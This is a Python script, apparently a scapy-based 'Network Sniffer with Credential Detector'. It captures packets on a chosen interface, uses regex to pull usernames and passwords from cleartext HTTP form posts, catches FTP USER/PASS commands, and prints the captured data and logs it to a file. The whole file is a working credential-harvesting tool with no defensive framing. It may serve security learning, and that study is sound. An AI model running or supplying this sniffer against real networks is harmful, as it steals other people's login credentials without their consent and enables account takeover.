import scapy.all as scapy
import argparse
from scapy.layers import http
from scapy.layers.inet import TCP
import time
import re
from datetime import datetime

detected_credentials = []
LOG_FILE = "credentials_log.txt"

def get_interface():
    parser = argparse.ArgumentParser(description="Network Sniffer with Credential Detector")
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on", required=True)
    parser.add_argument("-t", "--time", dest="time", type=int, help="Capture duration in seconds", default=0)
    parser.add_argument("-c", "--count", dest="count", type=int, help="Number of packets to capture", default=0)
    args = parser.parse_args()
    return args.interface, args.time, args.count

def log_credential(credential_info): 
    with open(LOG_FILE, "a") as f:
        f.write(f"{credential_info}\n")

def process_packet(packet):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    src_ip = packet[scapy.IP].src if packet.haslayer(scapy.IP) else "N/A"
    dst_ip = packet[scapy.IP].dst if packet.haslayer(scapy.IP) else "N/A"
    
    # HTTP Credential Detection
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
        print(f"[+] HTTP Request >> {host}{path}")
        
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            
            # Looks for username and password fields 
            username_match = re.search(r"(username|user|email)=([^&\s]+)", load, re.I)
            password_match = re.search(r"(password|pass|pwd)=([^&\s]+)", load, re.I)
            
            if username_match or password_match:
                cred_info = f"[HTTP] {timestamp} | {src_ip} -> {dst_ip} | Host: {host} | Path: {path} | Data: {load}"
                print(f"[+] HTTP Credential detected: {cred_info}")
                log_credential(cred_info)
                detected_credentials.append(cred_info)
    
    # FTP Credential Detection
    elif packet.haslayer(TCP) and (packet[TCP].dport == 21 or packet[TCP].sport == 21):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            
            # Checks for FTP USER and PASS commands
            if "USER" in load or "PASS" in load:
                cred_info = f"[FTP] {timestamp} | {src_ip} -> {dst_ip} | Data: {load.strip()}"
                print(f"[+] FTP Credential detected: {cred_info}")
                log_credential(cred_info)
                detected_credentials.append(cred_info)

def spoof(iface, duration=0, count=0):
    print(f"Starting network sniffer on interface: {iface}")
    if duration > 0:
        print(f"Capture duration: {duration} seconds")
    if count > 0:
        print(f"Packet count limit: {count}")
    print("Press Ctrl+C to stop...")
    print("-" * 50)
    
    try:
        sniff_params = {
            'iface': iface,
            'store': False,
            'prn': process_packet
        }
        
        # Input validation for duration and count
        if duration > 0:
            sniff_params['timeout'] = duration
        if count > 0:
            sniff_params['count'] = count
            
        scapy.sniff(**sniff_params)
    except PermissionError:
        print("[!] Permission denied. Please run as administrator/root.")
        print("[!] This tool requires elevated privileges to capture network packets.")
    except KeyboardInterrupt:
        print("\n[!] Sniffing stopped by user.")
    except OSError as e:
        print(f"[!] OS Error during packet capture: {e}")
        print("[!] This might be due to invalid interface name or insufficient permissions.")
    except Exception as e:
        print(f"[!] Unexpected error during packet capture: {e}")
        print("[!] Please check your interface name and permissions.")
        print("[!] Try running as administrator/root.")

def print_summary():
    print("\n" + "=" * 60)
    print("CREDENTIAL DETECTION SUMMARY")
    print("=" * 60)
    
    if detected_credentials:
        print(f"Total credentials detected: {len(detected_credentials)}")
        print("\nDetected Credentials:")
        for i, cred in enumerate(detected_credentials, 1):
            print(f"{i}. {cred}")
    else:
        print("No credentials detected during the capture session.")
    
    # Reads the log file and prints it on the terminal
    try:
        with open(LOG_FILE, "r") as f:
            log_lines = f.readlines()
            if log_lines:
                print(f"\nCredentials logged to: {LOG_FILE}")
                print(f"Log file contains {len(log_lines)} entries")
    except FileNotFoundError:
        print(f"\nNo log file found: {LOG_FILE}")

def main():
    try:
        iface, duration, count = get_interface()
        
        if duration < 0:
            print("[!] Duration must be positive. Using unlimited duration.")
            duration = 0
        if count < 0:
            print("[!] Count must be positive. Using unlimited count.")
            count = 0
         
        spoof(iface, duration, count)
        
        print_summary()
        
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

if __name__ == "__main__":
    main() 

